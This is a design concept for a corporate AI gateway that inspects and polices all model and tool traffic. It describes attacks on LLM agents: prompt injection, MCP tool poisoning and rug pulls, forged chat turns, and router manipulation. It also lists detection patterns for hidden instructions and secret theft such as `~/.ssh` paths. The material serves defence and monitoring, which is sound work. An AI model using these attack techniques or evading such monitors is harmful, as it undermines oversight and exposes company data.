# AI Control Layer: Solution Concept

*Status: concept / pre-implementation · 2026-10-03*
*Inputs: CRITERIA "AI Control Layer" brief, `compass_artifact` threat-landscape report, `RESEARCH-REPORT.md` (systematic-review corpus).*

---

## 1. Summary

We are building a **company-wide AI gateway**. **All AI traffic goes through it, in both directions**:
- every prompt and every model response;
- every tool call and every tool result;
- file contents and documents the agent reads;
- embedding requests;
- MCP traffic.

Every request and response is classified for personal data, leaked secrets, injection attempts and data sensitivity. Then the gateway:
- identifies the user or agent;
- checks their permissions;
- applies deterministic and AI-based controls;
- picks the model;
- enforces budgets;
- writes everything to a tamper-evident audit log.

An **admin panel** governs the whole system: users and groups, permissions, policies, models, budgets, incidents, approvals and security posture. It also has **Automation Insights**, which finds repetitive work in AI usage and turns it into governed, cheaper "skills".

Employees reach the gateway through existing open-source clients that we lock down; we don't write our own clients:
- **OpenCode** for developers (coding agent, local tools), extended with our plugin and an admin-managed config;
- **LibreChat** for non-technical staff (chat);
- **Keycloak** for company single sign-on (SSO). Keycloak handles authentication only; authorisation lives in our policy and panel.

Admins grant each user or group access to **models across connectors**: local Ollama models, Gemini as the cloud demo connector, and fine-tuned local specialists that `auto` picks by task. Admins also see and edit each user's tools and MCP servers, and their full activity history.

The guarantee comes from **deterministic enforcement** (identity, permissions, data-flow rules, budgets, signatures). AI-based detectors are a probabilistic layer that raises risk and escalates. They never grant access.

---

## 2. The brief and how we score

| Criterion | Weight | How this concept addresses it |
|---|---|---|
| Robustness & quality of guardrails | 30% | Layered pipeline: deterministic → classifier → local judge; "Rule of Two" taint rules; MCP pinning; four-layer data-exfiltration lockdown |
| Architecture & performance efficiency | 20% | Cheap checks first, early exit, judge only on uncertain or risky cases; per-control latency telemetry; hot reload without restart |
| Security reporting | 20% | Admin panel: posture, incidents with full decision traces, spend, false-positive rate next to block rate, OCSF/JSONL export |
| Completeness of self-testing suite | 15% | Allowed/blocked pair per control, strictness matrix, budget tests, exploit tests, "switch off each control → a test must fail" |
| Practical implementability & scalability | 15% | OpenAI-compatible API (integration = change `base_url`); off-the-shelf clients; Keycloak SSO; runs on docker-compose; same config deploys to real Windows/macOS fleets |

Formal requirements → sections:
1. centralised policy engine → §11;
2. deterministic and semantic controls → §6;
3. budgets → §8;
4. historical attacks → §9.2 (plus the data-exfiltration lockdown in §10);
5. reporting and audit → §12–13;
6. test suite → §16.

The brief says client apps are **not assessed**. We therefore use existing clients and spend our effort on the gateway, the panel and the tests.

---

## 3. Design principles

1. **Assume the model will be fooled.** OWASP LLM Top 10 2026 starts from this assumption. Adaptive attacks broke 12 published defences with >90% success ("The Attacker Moves Second"), and 8 indirect-injection defences >50% [6882]. Classifiers are sensors, not walls.
2. **Deterministic gates decide; AI escalates.** An AI check can turn *allow → warn / block / ask human*. It can never turn *deny → allow*.
3. **Cheap first, expensive last.** About 80–95% of traffic should be decided at the deterministic and small-classifier stages in milliseconds. The LLM judge runs only on the uncertain or high-risk fraction, and its budget is itself a policy entry.
4. **Enforce at the tool-call boundary.** The strongest results in the literature all come from deterministic enforcement between the agent and its tools: Progent 39.9%→1.0% ASR, PEP 40%→5%, CaMeL 0 attacks.
5. **Inspect all traffic, both ways.** Every prompt, response, tool call, tool result and embedding request is classified for PII, secrets, injection and sensitivity. Data leaks through tool arguments and tool outputs, not only through the final answer.
6. **State spans the session.** Taint flags, the pseudonymisation vault, budgets and loop counters live per session, not only per message.
7. **Every decision is explainable.** Each one records the rule ID, the stage that decided, the score, the latency, and the policy and signature versions in force.
8. **Measure false blocks as hard as blocked attacks.** The dashboard shows attack success rate (ASR), false-positive rate (FPR) and utility side by side.
9. **Fail closed for actions, fail open with alert for low-risk chat.** Configurable per control and per preset.
10. **Enforcement lives on the server.** Clients provide UX; the gateway enforces. Anything running on a user's machine can be tampered with.

---

## 4. Architecture

```
                         ┌──────────── policy/  (YAML, versioned, hot-reloaded) ────────────┐
                         │ controls · presets · groups & permissions · models · budgets ·    │
                         │ tool tiers · routing rules · feeds                                 │
                         └───────────────┬───────────────────────────────────▲───────────────┘
                                         │ watch + validate + atomic swap     │ writes new version
 ┌───────────── CLIENTS ──────────────┐  ▼                                    │
 │ OpenCode (devs) + plugin           │ ┌────────────────── GATEWAY ─────────┴──────────────────┐
 │   managed config, SSO              │ │ 0 Identity: Keycloak JWT / personal API key → user,    │
 │ LibreChat (staff), SSO             ├►│   groups, agent, session                               │
 │ LangGraph demo agent (agent id)    │ │ 1 Deterministic (~ms): RBAC, model allowlist, budgets, │
 │ any OpenAI SDK / IDE (API key)     │ │   rate/loop limits, PII & secrets (incl. PL ids),      │
 └────────────────────────────────────┘ │   signature feed, egress/URL rules, tool allowlist,    │
                                        │   MCP manifest pinning, Rule-of-Two taint              │
                                        │ 2 Semantic (cascade): small classifier → local judge   │
                                        │ 3 Router: sensitivity × complexity × budget → model    │
                                        │ Decision: allow | redact | pseudonymise | route_local  │
                                        │           | require_approval | block   (+ monitor)     │
                                        └───┬──────────────────┬─────────────────────┬──────────┘
                                            ▼                  ▼                     ▼
                                     Ollama (local)   Cloud connectors      MCP proxy → MCP servers
                                     general, PL,     (Gemini for demo;     (governed tool server,
                                     coder, fine-     any OpenAI-           demo servers)
                                     tuned specialists compatible API)
                                            │
            every decision ─► event stream ─► hash-chained audit log (JSONL/OCSF) + Postgres + metrics
                                            ▼
 ┌──────────────────────────────────── ADMIN PANEL (Next.js) ──────────────────────────────────────┐
 │ Posture · Incidents · Approvals · Users/Groups/Permissions · Policies (edit/diff/dry-run) ·     │
 │ Models · Budgets & spend · MCP inventory · Automation Insights · Exports                         │
 └──────────────────────────────────────────────────────────────────────────────────────────────────┘
 Background workers: signature-feed sync · model-artifact scanner · workflow miner · metrics rollups
 Offline (WCSS GPUs): fine-tune guard/router model → safetensors → artifact scan → model registry
 Identity: Keycloak (OIDC) shared by gateway, panel, LibreChat and the OpenCode plugin
```

### Components

| Component | Responsibility | Tech (proposed) |
|---|---|---|
| **Gateway** | OpenAI-compatible API (`/v1/chat/completions`, `/v1/embeddings`, `/v1/models`), decision pipeline, router, budgets, streaming | Python 3.12, FastAPI, httpx, Pydantic v2 |
| **MCP proxy** | Proxies the MCP `tools/list` and `tools/call` messages: pinning, description scanning, per-call authorisation, argument validation, taint, result scanning | Python, official MCP SDK (same process or sidecar) |
| **Decision API** | `POST /v1/decide`: lets clients (the OpenCode plugin) ask about a local action before running it | Gateway |
| **Governed tool server** | Our own MCP server with safe, policy-labelled tools (files, search, shell, git, email (mocked), HTTP) | Python MCP server |
| **Policy store** | YAML files = the single source of truth; validated, versioned, hot-reloaded | `policy/` dir + watchdog |
| **Event / audit store** | Hash-chained JSONL audit log + Postgres for querying + Prometheus metrics | Postgres (SQLite acceptable for demo), prometheus-client |
| **Admin panel** | All management and reporting UI | Next.js + TypeScript |
| **Identity provider** | Company SSO: users, groups, MFA, client credentials for agents | Keycloak (Apache-2.0) |
| **Workers** | Feed sync, artifact scanning, workflow mining, rollups | Python (async tasks or separate container) |
| **Model runtime** | Local models: guards, judge, embeddings, chat/coding models | Ollama (+ ONNX Runtime for the small classifier) |

---

## 5. Clients and entry points

| Client | Who | Integration | What it demonstrates |
|---|---|---|---|
| **OpenCode** + `@corp/opencode-guard` plugin + managed config | Developers | Custom provider whose `baseURL` is the gateway; SSO via plugin; local tools checked via `/v1/decide` | Coding agent with local files/shell under policy; data cannot leave via other providers |
| **LibreChat** | Non-technical staff (e.g. bank employees) | Custom OpenAI-compatible endpoint = gateway; Keycloak OIDC login | Chat with redaction notices, local routing of sensitive data, skills as models |
| **LangGraph demo agent** | Autonomous agent | Agent identity (Keycloak client credentials); tools via MCP proxy | Indirect injection, Rule of Two, approvals, loops/budgets |
| **Any OpenAI SDK / IDE** | Integrators | Personal API key issued in the admin panel | "Integration = change `base_url`" |

**`/v1/models` is personalised.** The gateway returns only the models and published skills that the caller's groups allow. Every client therefore shows each user exactly what they may use, including newly published skills, with no client changes.

### 5.1 OpenCode integration (verified against current docs/SDK)

The plugin API exposes the hooks we need:
- `auth`: custom login methods for a provider (`oauth` / `api`), used for company SSO;
- `chat.headers`: adds headers to each LLM request;
- `tool.execute.before`: can block a tool by throwing;
- `permission.ask`: takes part in approval prompts.

Plugin responsibilities:
- **Login:** Keycloak OAuth device-code flow (show a code, confirm in the browser), with token refresh in the auth `loader`.
- **Attribution:** attach the token and a device ID to every LLM request.
- **Local tool governance:** before `read`, `write`, `edit`, `bash`, `webfetch` or an MCP call, call `/v1/decide`. The answer is `allow`, `block` (throw with the rule ID), or `require_approval` (wait for approval from the user or the panel).

**Managed config.** OpenCode's managed settings cannot be overridden by users or projects. They live in `%ProgramData%\opencode` on Windows, `/etc/opencode` on Linux, and as MDM-pushed preferences on macOS:

```json
{
  "enabled_providers": ["company"],
  "provider": {
    "company": {
      "npm": "@ai-sdk/openai-compatible",
      "name": "Company AI Gateway",
      "options": { "baseURL": "https://ai-gateway.corp/v1" },
      "models": { "auto": {}, "local-coder": {} }
    }
  },
  "model": "company/auto",
  "plugin": ["@corp/opencode-guard"],
  "share": "disabled",
  "permission": { "webfetch": "deny" },
  "autoupdate": false
}
```

- `enabled_providers` → every other provider is ignored, even if the user has their own key.
- `share: "disabled"` → closes OpenCode's public session-sharing link, an easy-to-miss leak path.
- `webfetch` denied, or routed through `/v1/decide` → the agent can't post data to arbitrary URLs.
- Remote config from `opencode auth login https://ai.corp` (`/.well-known/opencode`) is only a **convenience**: it has the lowest precedence, so it is never used for enforcement.

To verify during the build:
- the exact `auth` hook signatures in the current SDK;
- whether the `models` list can be dynamic or must be static (irrelevant for security, since the gateway decides).

### 5.2 Identity: Keycloak for authentication, our app for authorisation

**Decision: use Keycloak (Apache-2.0) for authentication only ("who are you"). Everything about "what may you do" lives in our policy and admin panel.**

Why not built-in auth in our app plus "we could support OpenID" in the pitch:
- **Built-in auth wouldn't save work.** LibreChat logs in via OIDC, so it needs an OIDC provider anyway. The OpenCode plugin needs the OAuth device-code flow, and agents need client credentials. Building a standards-compliant provider ourselves takes more work than configuring Keycloak, not less.
- **"We could" scores lower than "we do"** on implementability (15%). Banks federate Active Directory / Entra ID through exactly this kind of identity provider. Keycloak supports AD/LDAP federation, MFA and SSO across all our clients today.
- **The cost is small and reproducible.** One container (~1 GB RAM, ~20 s startup). A `realm-export.json` imported on startup defines all users, groups and clients, so `docker compose up` gives everyone the same demo users.

How the split works:
- **Keycloak handles:**
  - login and MFA;
  - user identity and coarse **groups** (claims in the JWT);
  - clients for the gateway, the panel, LibreChat and the OpenCode device flow;
  - one client-credentials client per agent.
- **Our app handles:**
  - users are provisioned just-in-time on first login (ID, email, groups from the token);
  - everything about access is managed in our panel: group-level rules and grants in the policy files, per-user grants in the database (§11): models, connectors, tools and MCP servers, budgets, presets.

  We don't need to drive the Keycloak admin API. The panel shows Keycloak groups read-only, and an "Open in Keycloak" link handles user creation.
- **Fallback:** personal API keys issued in the panel still work for SDKs and scripts. They are tied to the same user.

---

## 6. Decision pipeline

### 6.1 Inspection points

**Every request and every response is inspected, not only tool calls.** Each payload passes through the same engine. The classification layer runs on all of it:
- PII (named-entity recognition + validators, including Polish IDs);
- secrets and credentials;
- injection / jailbreak signals;
- data-sensitivity class (public / internal / confidential / restricted);
- signature-feed matches.

Its results drive every later decision: redaction, routing, taint, budgets, the audit log, and the incident and reporting views.

| # | Point | Direction | Examples of what gets classified |
|---|---|---|---|
| 1 | **Ingress** | user/agent → model | Prompt text, pasted documents, attachments, the full conversation history sent with each request |
| 2 | **Egress** | model → user/agent | Answer text (PII or secrets the model reproduces, system-prompt leakage, exfiltration links) **and** the model's `tool_calls` |
| 3 | **Tool call** | agent → tool | Tool name and arguments (paths, shell commands, URLs, email recipients/bodies, SQL), via the MCP proxy or `/v1/decide` |
| 4 | **Tool result** | tool → agent | File contents, command output, web pages, emails, database rows, RAG chunks. Untrusted by default; scanned for both injection and PII/secrets **before** re-entering the context |
| 5 | **Embeddings** | app → embedding model | Text sent to be embedded is treated as outbound data (embeddings can be inverted) |
| 6 | **Agent → agent / memory write** | between agents, into memory | Messages and memory entries (stretch goal) |
| 7 | **Artifact load** | model registry → runtime | Model files (pickle opcodes, archive format, Keras Lambda layers) |

Classification happens on every hop because leaks rarely travel only through the final answer. In multi-agent systems most leakage goes through tool arguments, tool outputs and internal messages. Redacting internal channels cut internal leakage from 31.5% to 2.4% [1749]. A database MCP connector's over-exposure fell from 0.880 to 0.000 once its outputs were scanned [14033].

**Cost control.** The deterministic classifiers (regex + validators, signatures) run on everything in milliseconds. NER and the small classifier also run on everything, with results cached by content hash, so the repeated conversation history isn't re-scanned on every turn. Only the LLM judge is reserved for uncertain or high-risk cases.

### 6.2 Stages

| Stage | Controls | Latency target |
|---|---|---|
| **0 Normalise** | Unicode NFKC, strip zero-width / Unicode-tag characters, decode Base64/hex/URL encoding and rescan, strip chat-template special tokens (forged-turn attacks [1633]). **Typed normalisation of tool calls**: parse each call into a typed intent object (tool, arguments, resolved paths and URLs) and **fail closed on malformed calls** [32779] | <1 ms |
| **1 Deterministic** | AuthN/AuthZ (groups → models / tools / skills / data classes); model allowlist; size limits; budgets, rate limits, loop detection; **PII tier T0** (regex + validators: Luhn, IBAN mod-97, **PESEL, NIP, REGON, Polish ID card** checksums) and secrets (gitleaks-style rules, key prefixes, entropy); signature feed (regex/YARA, URL paths, package versions); egress rules (markdown images, URLs with high-entropy query strings, domain allowlist); tool policy tiers + pinned argument schemas (unknown fields rejected), path/command/SQL checkers; MCP manifest hash-pinning; IFC/taint rules (§9); canary token in system prompts | ≤5–15 ms |
| **1b Similarity** | Embedding kNN (bge-m3) against the known-attack corpus, which grows from the signature feed and from blocked incidents. Catches paraphrases of known attacks that exact signatures miss [43490]. Uses mean + n-gram pooling so short injections in long text aren't diluted [32805] | ~5–20 ms |
| **2 Semantic L1** | **PII tier T1**: NER (Presidio + a multilingual GLiNER PII model). Presidio alone recalled only 0.56 of PII in one study [441], so it can't be the only NER. Small injection/jailbreak classifier (an Apache-licensed DeBERTa or Prompt Guard 2 via ONNX; later our fine-tuned PL model, §15) on prompts **and** tool results; Bielik Guard for Polish content safety; sensitivity / complexity / task scores for the router | ~10–50 ms CPU |
| **3 Semantic L2** (escalation only) | Local judges via Ollama, each a narrow task: **(a)** tool-call alignment, i.e. does this call serve the user's original intent, judged in an isolated context (IntentGuard-style with a Qwen3-8B-class judge [752]; AlignmentCheck pattern [23757]); **(b)** contextual-integrity check before every "send"-type action (PrivacyChecker: leakage 36%→7% [4114]); **(c)** **PII tier T2**: contextual/quasi-identifier detection by a local SLM when T0/T1 are uncertain or the preset is strict (stacked tiers: 97.3% vs 72.1% leak prevention for regex alone [1660]); **(d)** detect-and-remove of injected spans in tool results (PromptArmor pattern [23811]); **(e)** content safety (Granite Guardian / Qwen3Guard). The judge's own input is spotlighted and stripped of untrusted instructions, because judges can be injected too [11906] | ~0.3–1 s, only on the risky fraction |
| **4 Decide** | Compose a graded risk score (§6.5) from all verdicts; deterministic denials are final; apply preset and fail mode; map the result to an action (§6.3) | — |
| **5 Egress hygiene** | Strip `logprobs` and reasoning traces from responses by default (they make jailbreaking far cheaper [3400] and leak private data [3573]); check outputs against system-prompt canaries and similarity (77% fewer extraction incidents [1987]); check placeholders in returned text (reject hallucinated ones [17591]); streaming moderation with hold-back windows (Qwen3Guard-Stream-style) | per chunk |

Pipeline mechanics:
- Independent checks run in parallel (`asyncio.gather`).
- Verdicts are cached by content hash.
- Each control has its own timeout.
- The pipeline exits early on a deterministic block.
- L2 runs only when an L1 score falls in an uncertainty band (e.g. 0.3–0.8) or the action is high-risk.

### 6.3 Actions

| Action | Effect |
|---|---|
| `allow` | Pass through |
| `monitor` | Pass, but log and tag (shadow mode) |
| `redact` | Replace spans with typed masks |
| `pseudonymise` | Replace spans with consistent placeholders (`<PERSON_1>`) held in a session vault; restore on the way back **only for allow-listed entity types and authorised principals, never into outbound tool arguments**. Naive restore leaked unauthorised values in 78.2% of cases; allow-list restore leaked 0% [24126] |
| `route_local` | Force a local model (sensitive data never leaves). The best privacy/utility trade-off in the corpus: leakage 100→7.5 for −2.7 quality, against −11 for plain redaction [4245] |
| `sanitize` | For tool results: remove the injected spans and pass on the rest, instead of dropping the whole result (PromptArmor-style; keeps utility) [23811][6500] |
| `downgrade` | Continue with reduced capability: read-only tool set, local model, narrower path scope, no external sinks for the rest of the session (graded decisions, IBBC-Guard [32808]; MCP-Secure read-only defaults [2461]) |
| `require_approval` | Hold until a human approves (the user in the client, or an admin in the panel). Can grant **time-boxed elevation**, e.g. write access for 15 minutes [2461] |
| `block` | Reject with rule ID and explanation |

PII defaults follow the evidence:
- **Pseudonymise** direct identifiers and quasi-identifiers. **Partial** pseudonymisation kept 56% task success against 42% for full pseudonymisation [5024].
- **Redact** in logs and in low-privilege outputs.
- **Block** secrets and credentials.
- **Route local** for restricted data classes.

A **session risk accumulator** counts the distinct quasi-identifiers released per session. Crossing a threshold escalates the action, because re-identification risk compounds over the turns of a conversation [1623].

### 6.4 Strictness presets

The "adherence" setting maps to these presets. They can be set per group, per route or per control:

| Preset | Deterministic | Semantic | Typical action on hit |
|---|---|---|---|
| `monitor` | all evaluated | classifier only | log + tag, never block |
| `balanced` (default) | all | classifier; judge on tool calls to sinks | pseudonymise PII, block high-confidence injection, approval for irreversible tools |
| `strict` | all + tool allowlist only | classifier + judge on every outbound action | block on any injection signal; sensitive data → local only; secrets never leave |
| `paranoid` | strict + full taint (untrusted data can never reach a sink) | judge on everything | block; read-only tools; approval on all writes |

The dashboard shows what each preset costs: FPR, benign task success and latency.

### 6.5 Graded risk scoring

Deterministic denials are final. Everything else feeds a composite risk score, which maps to a graded decision instead of a binary allow/block. This follows IBBC-Guard (ASR 1.000→0.000, benign completion 0.983→0.971, 14.2% overhead [32808]) and ALLOW/ESCALATE/DENY tiers [1395].

| Factor | Source |
|---|---|
| Intent deviation | L2 alignment judge (tool call vs the user's original request) |
| Tool sensitivity | Tool labels (`irreversible`, `external_egress`) |
| Resource/data sensitivity | Data class from the classifiers; session taint |
| Chain anomaly | Unusual tool sequence for this agent or group; repeated calls; spend spike |
| Parameter risk | Argument checkers, signature hits, high-entropy payloads |

**Score → action:** `allow` → `sanitize` / `downgrade` → `require_approval` → `block`. The preset sets the cut-offs. The trace shows each factor's contribution, so a judge can see *why*.

### 6.6 Shadow judge and judge calibration

- **Shadow mode:** under `balanced`, a sample of **allowed** traffic (e.g. 5%) also goes to the L2 judge asynchronously, without affecting latency. Disagreements are logged, which gives the panel an **estimated miss rate**, not just a block count.
- **Calibration:** every local judge is scored against a small hand-labelled set before use. The panel reports agreement (Cohen's κ) and FPR/FNR. Local 7–9B judges are weaker than the frontier judges in the papers [23757][23811], so we measure ours rather than quote theirs.
- **The judge is never the only line:** for consequential actions a deterministic rule (taint, tiers, allowlists) must also exist, and the judge can only escalate.

---

## 7. Routing and models

- **Virtual models.** Clients request `auto`, a named alias (`local-coder`, `fast`, `smart`) or a skill (`skill/loan-memo-summary`). The router resolves this to a concrete model.
- **Routing inputs:**
  - user/group permissions;
  - data sensitivity (deterministic detectors + classifier);
  - task complexity (classifier score bands, e.g. `<0.3` local, `0.3–0.7` small external, `≥0.7` large external);
  - remaining budget.
- **Sensitivity → action table:**

  | Sensitivity | Action |
  |---|---|
  | `high` | `local_only` |
  | `medium` | `redact_then_external` |
  | `low` | route by complexity |

- **Budget-aware escalation.** The threshold for escalating to an external model tightens as the remaining budget falls. When the budget is exhausted, requests are served locally and the response is **marked as degraded**, never silently.
- **Model registry** (in policy): ID, connector, tier (local/cloud), prices (input and output separately), USD per GPU-second for local models, allowed data classes, capability tags, artifact scan status.
- **Router hardening.** Escalation-rate drift is monitored. Prompts crafted to push the router toward the expensive model ("confounder gadgets" [13313]) show up as an anomaly and still count against the budget.

### 7.1 Connectors and per-user model access

- **Connectors** are upstream providers: `ollama` (local), `gemini` (cloud demo), and any OpenAI-compatible API.
  - Credentials live **only in the gateway**, in a secrets file or environment, never in the policy and never on clients.
  - The admin panel shows connector health, latency and spend, and can disable a whole connector with one switch (kill switch).
- **Grants:** an admin gives a **group or an individual user** access to:
  - connectors;
  - concrete models;
  - aliases (`auto`, `smart`, `local-coder`);
  - skills.
- **Constraints per grant:**
  - allowed data classes (e.g. cloud connectors only up to `internal`);
  - budget share;
  - preset;
  - **expiry** (e.g. "Jan gets Gemini for 7 days for a pilot").
- **Resolution order:** org-locked rules → group grants → user grants. A user grant can extend access, but **never past an org-locked rule** (e.g. "restricted data never goes to a cloud connector").
- **Where they live:** org locks and group grants are in the policy files. Per-user and temporary grants are in the database (§11), so the policy files define the ceilings and the database holds assignments within them.
- **Effect everywhere:** a user's personalised `/v1/models` lists exactly their effective grants. A request for anything else → 403 + incident. Sensitive data sent to a model whose data classes don't allow it → `route_local` (or `block` under `paranoid`).

### 7.2 Model line-up

Final sizes depend on the demo GPU. Ollama loads models on demand, and `OLLAMA_MAX_LOADED_MODELS` caps how many stay in VRAM at once.

| Role | Model (candidate) | Connector | Licence |
|---|---|---|---|
| General local chat + tool calling | Qwen3 8B (4B on smaller GPUs) | ollama | Apache-2.0 |
| **Polish** local chat | Bielik v3 (11B, or 4.5B / Minitron-7B), available on Ollama from SpeakLeash | ollama | Apache-2.0 |
| Local coding | Qwen2.5-Coder 7B (or a newer Qwen coder that fits) | ollama | Apache-2.0 |
| Embeddings (mining, kNN) | bge-m3 (multilingual) | ollama | MIT |
| **Cloud demo** | Gemini (concrete model TBD) via Gemini's OpenAI-compatible endpoint `https://generativelanguage.googleapis.com/v1beta/openai/` (chat, streaming, tools, embeddings, `/models`) | gemini | Paid API key |
| **Fine-tuned specialists** | e.g. `corp/loan-memo-pl`: LoRA on Bielik 4.5B or Qwen3-4B trained on WCSS (§15) | ollama | inherits the base model's licence |
| Guards | §6.2 + Bielik Guard (Polish content safety, §15) | local | see §18 |

**Gemini runs on a paid key.** Paid-tier terms are what a company would sign, so there's no free-tier data-use caveat; still re-check the current terms before the pitch. Even so, a cloud connector is a policy decision. The demo policy allows `public` and `internal` data to Gemini, while `confidential` and `restricted` data (PII, client data, secrets) is automatically routed to a local model. That is the routing story we want to show. Also:
- Everything works **offline without a Gemini key**: cloud aliases fall back to local and are marked degraded.
- The deterministic test mode mocks the connector.

### 7.3 `auto` with fine-tuned specialists

`auto` doesn't just pick "local vs cloud". It also picks **specialist models**:
1. **Task-category detection:** a head on the L1 classifier (§15), or kNN over the embeddings of each specialist's example prompts.
2. **Capability match:** registry models carry tags (e.g. `task: loan_memo`, `lang: pl`). If a specialist matches the task, the user has access to it, and the confidence is above its threshold, `auto` routes there.
3. Otherwise → the sensitivity × complexity × budget rules above.
4. The trace and the response metadata show **why** that model was chosen ("auto → corp/loan-memo-pl: task=loan_memo (0.91), data=confidential → local").

**The loop with Automation Insights (§14):**
1. A recurring task is detected.
2. It's published as a skill.
3. Optionally, a specialist model is fine-tuned on WCSS from approved, redacted examples (synthetic data in the demo).
4. The model is scanned and registered.
5. `auto` starts using it, so routine work moves from a general (or cloud) model to a small local specialist. The dashboard shows the savings and the quality checks.

---

## 8. Budgets and resource governance

- **Hierarchy:** org → team/group → user → agent → session → call.
- **Meters:**
  - tokens, with input and output priced separately;
  - USD;
  - **GPU-seconds for local models**, from Ollama's `eval_duration` / `prompt_eval_duration` × a configured $/GPU-second;
  - requests per minute (token bucket);
  - tool calls;
  - wall-clock time.
- **Pre-dispatch:** estimate the input tokens and the maximum output, check every applicable budget, reject or downgrade.
- **In-stream:** count tokens live, cut the stream at `max_output_tokens` or the reasoning cap, detect repeated n-grams (endless-generation attacks).
- **Post-response:** reconcile actual usage into the ledger and update the burn rate.
- **Loops and runaways:**
  - limits on steps, tool-call depth and fan-out;
  - the same (tool, args-hash) repeated N times within a window;
  - the "same failing test, same fix" pattern in coding agents;
  - a jump in the rate of token spend.
- **Breach handling:** soft alert at 80%; a hard limit trips a **circuit breaker** (closed → open → half-open, with cooldown).
- **Budgets live in the gateway, not the router.** Per-call routers can't bound cumulative spend [30635], so session, agent and team ledgers sit in the enforcement point.
- **Guard spend is a budget line too.** Policy mediation inflated tokens 2.0–2.8× in one study [698]. Judge tokens and GPU-seconds are metered separately, with a per-request `guard_budget`.
- **Context-growth signal:** in multi-step agents, cumulative input tokens grow roughly quadratically with the number of rounds [42049]. Tokens-per-step growth is a loop/runaway signal, and a trigger to compact.
- **Response cache:** exact-match and canonical-question caching (cache hit rates up to 73% reported [950]). **Scoped per user and data class**, never shared across users: shared caches leak prompts across tenants [10811].
- **Resource-exhaustion attacks covered:**
  - endless generation (repeated n-grams, output cap) [51953];
  - OverThink decoy reasoning (reasoning-token cap) [10718];
  - router "confounder gadgets" [13313];
  - **false-positive DoS**, i.e. tripping the guard to block legitimate traffic [34714]. This is one reason the FPR is monitored per rule.

---

## 9. Tool, MCP and agent governance

- **Tool policy tiers:** each tool sits in one of four tiers: `deny`, `must` (required in this context), `allow`, or `confirm` (human approval). These four tiers were formally verified in Alloy [426].
- **Monotonic confinement:** within a session, the permitted action space can only **narrow** without human approval, never widen (Progent: AgentDojo ASR 39.9%→1.0% [7540]).
- **Labels for information-flow control (IFC):**
  - **Data labels** have two dimensions: integrity (`trusted` / `untrusted`) × confidentiality (`public` / `internal` / `confidential` / `restricted`). They propagate across steps [10632].
  - **Tool labels:** `reads_untrusted`, `touches_sensitive`, `external_egress`, `irreversible`, plus SAMOS-style capability annotations (`network`, `filesystem`, `env`, `exec`, `libraries`) [2944]. We don't rely on MCP's own `readOnlyHint` / `openWorldHint`, which are too coarse [7555].
  - Per tool: allowlists, **pinned argument schemas with unknown fields rejected** (this defeats "parasitic parameters" such as a malicious `task_history` argument [2822]), path canonicalisation, SQL parsing, command classes and recipient allowlists.
- **Per-user tools and MCP servers.** The admin grants MCP servers, individual tools and OpenCode's built-in tools (`read`, `edit`, `bash`, `webfetch`) to groups or users, with the same override, expiry and org-lock rules as models (§7.1).
  - The MCP proxy returns a **personalised `tools/list`**: a user's agent never even sees tools it may not call.
  - `/v1/decide` enforces the same grants for OpenCode's local tools.
  - Revoking a grant takes effect on the next call, with no client change.
- **Rule-of-Two / "lethal trifecta" engine.** The session carries taint flags (`untrusted`, `sensitive`). A call that would complete the trifecta (untrusted input + sensitive data + external communication) gets `require_approval` or `block`, **whatever the classifier scores say**. This is our strongest guarantee.
- **Task-scoped policy (plan-then-enforce).** Under `strict` and `paranoid`:
  1. At the start of an agent task, a local LLM that sees **only the trusted user request** (never tool outputs) proposes a narrow policy for this task: which tools, which argument ranges, which sinks. It can also propose an expected tool-dependency graph.
  2. The gateway **intersects** that proposal with the static policy. The result can only be narrower.
  3. The gateway enforces it **deterministically**: calls outside the plan are blocked or need approval.

  Evidence: Conseca, an LLM-written policy enforced deterministically and "impervious to prompt injection" within its threat model [7556]; IPIGuard's tool graph, ASR 13.16%→0.69% [3605]; DRIFT, 30.7%→1.4% [3444]. This is the "plan-then-execute" pattern from *Design Patterns for Securing LLM Agents*.
- **MCP integrity** (at the MCP protocol messages listed):
  - `initialize`: bind the server identity to its origin and transport; reject servers not on the allowlist; record the declared capabilities [18991].
  - `tools/list` and `list_changed`: canonicalise each tool and pin `sha256(name+description+inputSchema)`. On drift (a "rug pull"), quarantine the tool, raise an incident and require re-approval [300][941].
  - Scan descriptions for imperative or hidden instructions (`<IMPORTANT>`, "do not tell the user", references to other tools, `~/.ssh`), zero-width / Unicode-tag characters and Base64 blobs. Ambiguous descriptions go to the L2 judge, because implicit poisoning steers the agent toward *other* tools [9673][752].
  - Detect cross-server **name collisions / shadowing** and squatting [9674].
  - `sampling/createMessage` (server → client): **denied by default**. It has no origin authentication, so a server could inject text in the user role [9662].
  - **MCP 2026-07-28 (stateless):** route and pre-check from the `Mcp-Method` / `Mcp-Name` headers on the fast path, but **verify that the body matches the headers**. A mismatch is itself an attack signal. Also support 2025-11-25, which most clients still speak.
  - OAuth metadata URLs from MCP servers: `https` only, no shell metacharacters (the mcp-remote command injection, CVE-2025-6514). **No token passthrough**: the MCP spec forbids servers from accepting tokens not issued to them.
  - Keep an allowlist of MCP servers and flag shadow MCP servers.
- **Gateway blind spots and how we cover them.** A proxy can't see three things:
  - **What a server does behind its API**, e.g. a malicious server emailing data itself [810]. Covered by running MCP servers in containers with an **egress allowlist** (sandbox egress isolation blocked 100% of C2 connections [398]) and static scanning of server code and manifests (mcp-scan-style) before approval.
  - **Built-in tools that bypass MCP** [7540]. Covered by `/v1/decide` in the OpenCode plugin (§5.1).
  - **Misuse of data the role is entitled to** [14033]. Covered by minimisation and the contextual-integrity check (§6.2).
- **Database tools (bank demo).** A "core banking" MCP database server governed with the rungs from [14033]: read-only engine, row/column scoping per role, SQL parsing (stacked statements rejected [302]), result redaction, canary rows. That paper's gateway took attacker success to 0.000 on its 17-attack suite.
- **Quarantine mode (`paranoid`, stretch goal).** Untrusted tool results never reach the privileged model as free text. A quarantined local LLM extracts only schema-typed fields (e.g. `{amount: number, date: date}`), and the agent sees those values or opaque handles. This is the Dual-LLM/CaMeL idea (CaMeL: 0 successful attacks at 77% utility [10631]; Dual-LLM in ADK: 25.6%→0% ASR [24321]).
- **Skills are secure by design.** A published skill (§14) is a fixed template with a typed input and a narrow toolset. That corresponds to the *action-selector* / *map-reduce* patterns, which resist prompt injection by construction. Moving routine work into skills improves security as well as cost.
- **Memory and A2A (stretch goals):** provenance-stamped memory writes and gated retrieval (CAMS: 92.3% prevention [32342]); A2A Agent-Card validation (9/9 poisonings blocked, 0 false positives [1537]); signed inter-agent messages with a replay window [1613].
- **Tool results are untrusted:**
  - classifier scan, plus the judge for risky cases;
  - optional spotlighting (wrapping untrusted text in marked delimiters);
  - redaction of PII/secrets before the result re-enters the context.
